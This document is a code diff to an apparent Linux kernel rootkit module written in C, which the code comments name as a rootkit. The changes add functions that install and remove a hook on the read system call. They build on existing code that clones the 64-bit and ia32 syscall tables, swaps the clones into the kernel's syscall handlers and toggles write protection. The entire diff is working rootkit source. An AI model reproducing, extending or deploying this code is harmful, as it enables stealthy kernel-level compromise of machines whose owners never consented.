@@ -97,18 +97,14 @@
 #define EAX_EDX_VAL(val, low, high) (val)
 #define EAX_EDX_RET(val, low, high) "=A" (val)
 #endif
-//#define sleep(var) for(var = 0; var <= 1024 * 1024 * 1024; var++) {}
-#define sleep(var)
+#define sleep(var) for(var = 0; var <= 1024 * 1024 * 1024; var++) {}
+//#define sleep(var)
 
 /*
  * Kernel shared definitions: labels, variables and functions.
  */
 #include "kernel.h"
-
-/*
- * Hook handlers, backups, everything about hooking.
- */
-#include "hooking.h"
+#include "hooks.h"
 
 /*
  * Loader declarations.
@@ -143,6 +139,8 @@ inline unsigned long long notrace my_rdmsr(unsigned int msr);
 int safe_zero(void *dst, size_t len);
 int clone_sct(void *dst, void *src, size_t len);
 int sct_len(void *src, size_t *out_len);
+void install_hooks(void);
+void uninstall_hooks(void);
 
 /*
  * Global variables.
@@ -163,8 +161,8 @@ void enable_wp(void);
 
 int init_module(void)
 {
-	size_t kernel_len = 0, kernel_paglen = 0, kernel_pages = 0, my_sct_len = 0, my_sct_pagelen = 0;
-	void *kernel_addr = NULL, *tmp = NULL;
+	size_t my_sct_len = 0, my_sct_pagelen = 0;
+	void *tmp = NULL;
 	long addr = 0;
 	int ret = 0;
 
@@ -185,6 +183,9 @@ int init_module(void)
     f_find_vpid = find_vpid;
     f_vscnprintf = vscnprintf;
 	f_printk = printk;
+	f_sockfd_lookup = sockfd_lookup;
+	f_strncmp = strncmp;
+	f_probe_kernel_write = probe_kernel_write;
 
 	/*
      * uncomment this to be able to print into stdout/stderr with pinfo() and perr() functions, in dev mode.
@@ -257,7 +258,7 @@ int init_module(void)
 	}
 	pinfo("my_sct zeroed!\n");
 
-	sleep(ret);
+	//sleep(ret);
 
 	ret = clone_sct(my_sct, sys_call_table, my_sct_len);
 	if (ret != 0) {
@@ -266,7 +267,7 @@ int init_module(void)
 	}
 	pinfo("my_sct = %p, len = %d\n", my_sct, my_sct_len);
 
-	sleep(ret);
+	//sleep(ret);
 
 	/*
 	 * Clone the ia32 sct.
@@ -279,7 +280,7 @@ int init_module(void)
 	}
 	pinfo("ia32_sct len = %d\n", my_sct_len);
 
-	sleep(ret);
+	//sleep(ret);
 
 	my_sct_pagelen = PAGE_ROUND_UP(my_sct_len * sizeof(long));
 	// TODO: add KASLR offset in start address.
@@ -290,7 +291,7 @@ int init_module(void)
     }
 	pinfo("reserved %d bytes at %p.\n", my_sct_pagelen, my_ia32sct);
 
-	sleep(ret);
+	//sleep(ret);
 
     // zero memory
     ret = safe_zero(my_ia32sct, my_sct_pagelen);
@@ -300,7 +301,7 @@ int init_module(void)
     }
     pinfo("my_ia32sct zeroed!\n");	
 
-	sleep(ret);
+	//sleep(ret);
 
 	ret = clone_sct(my_ia32sct, ia32_sys_call_table, my_sct_len);
 	if (ret != 0) {
@@ -310,7 +311,7 @@ int init_module(void)
 	}
 	pinfo("ia32_sct cloned at = %p\n", my_ia32sct);
 
-	sleep(ret);
+	//sleep(ret);
 
     /*
      * Install the new SCTs into SYSCALL handler, and int 0x80 handler.
@@ -329,7 +330,7 @@ int init_module(void)
     }
     pinfo("after psct_fastpath = %x, psct_slowpath = %x, pia32sct = %x\n", *psct_fastpath, *psct_slowpath, *pia32sct);
 
-    sleep(ret);
+    //sleep(ret);
 
 	/*
      * Insert out rootkit into memory.
@@ -372,6 +373,11 @@ int init_module(void)
 		// uncomment for testing:
 		//(*f_kfree())(kernel_addr);
 
+		install_hooks();
+		sleep(ret);
+		sleep(ret);
+		sleep(ret);
+		uninstall_hooks();
 	} else {
 		perr("can not allocate memory.\n");
 	}
@@ -381,6 +387,19 @@ int init_module(void)
 
 void cleanup_module(void)
 {
+}
+
+void install_hooks(void) {
+    //HOOK64(__NR_recvfrom, KADDR(my_recvfrom64));
+	//HOOK32(__NR_recvfrom, KADDR(my_recvfrom32));
+	HOOK64(__NR_read, KADDR(my_read64));
+	//pinfo("my_read64 at %p\n", KADDR(my_read64));
+	pinfo("Hooks installed!\n");
+}
+
+void uninstall_hooks(void) {
+	UNHOOK64(__NR_read);
+	pinfo("Hooks uninstalled!\n");
 }
 
 int safe_zero(void *dst, size_t len) {
